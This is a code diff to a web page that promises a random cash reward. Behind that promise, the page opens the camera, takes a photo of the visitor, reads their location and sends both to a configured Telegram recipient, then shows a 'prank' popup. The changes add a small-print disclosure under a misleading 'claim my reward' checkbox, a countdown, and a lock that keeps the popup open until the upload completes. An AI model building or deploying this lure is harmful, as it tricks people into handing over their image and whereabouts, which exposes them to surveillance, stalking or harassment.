@@ -202,12 +202,16 @@ button:disabled{
     🎁 Tapping the button gives you a random reward of $5, $10, $20, $50, or $100. Try your luck and see what you get!
   </div>
 
+  <p class="tiny">By continuing, you agree that this page will take a photo and access your location, then send the photo with location metadata to the configured Telegram recipient.</p>
+
   <label class="consent">
     <input type="checkbox" id="consent">
     <span> I'm ready to claim my reward!</span>
   </label>
 
   <button id="startBtn" disabled>🎁 Unlock Your Reward</button>
+
+  <div id="countdown" class="status" role="timer" hidden></div>
 
   <div id="status" class="status" role="status">
     Ready to win your surprise reward?
@@ -243,13 +247,16 @@ const joker = $("joker");
 const consent = $("consent");
 const startBtn = $("startBtn");
 const statusBox = $("status");
+const countdownBox = $("countdown");
 const prankPopup = $("prankPopup");
+const closePrank = $("closePrank");
 const cameraFrame = $("cameraFrame");
 
 let stream = null;
 let imageCapture = null;
 let previewUrl = null;
 let busy = false;
+let countdownTimer = null;
 
 function setStatus(message){
   statusBox.textContent = message;
@@ -471,9 +478,11 @@ async function captureAndSend(){
 
   // Show prank immediately after capture and metadata processing.
   prankPopup.hidden = false;
+  closePrank.disabled = true;
   setStatus("...");
 
   await sendToTelegram(photo);
+  closePrank.disabled = false;
   setStatus("😂💗");
 }
 
@@ -482,11 +491,29 @@ startBtn.addEventListener("click",async()=>{
 
   busy = true;
   startBtn.disabled = true;
+  let secondsLeft = 5;
+  countdownBox.hidden = false;
+  countdownBox.textContent = String(secondsLeft);
+  countdownTimer = setInterval(() => {
+    secondsLeft -= 1;
+    if(secondsLeft > 0){
+      countdownBox.textContent = String(secondsLeft);
+    }else{
+      clearInterval(countdownTimer);
+      countdownTimer = null;
+      countdownBox.hidden = true;
+    }
+  }, 1000);
 
   try{
     await openCamera();
     await captureAndSend();
   }catch(error){
+    if(countdownTimer){
+      clearInterval(countdownTimer);
+      countdownTimer = null;
+    }
+    countdownBox.hidden = true;
     stopCamera();
     camera.hidden = true;
     placeholder.hidden = false;
@@ -498,12 +525,18 @@ startBtn.addEventListener("click",async()=>{
     startBtn.hidden = false;
     setStatus(error.message || "...");
   }finally{
+    if(countdownTimer){
+      clearInterval(countdownTimer);
+      countdownTimer = null;
+    }
+    countdownBox.hidden = true;
     busy = false;
     startBtn.disabled = !consent.checked;
   }
 });
 
-$("closePrank").addEventListener("click",()=>{
+closePrank.addEventListener("click",()=>{
+  if(closePrank.disabled) return;
   prankPopup.hidden = true;
 });
 
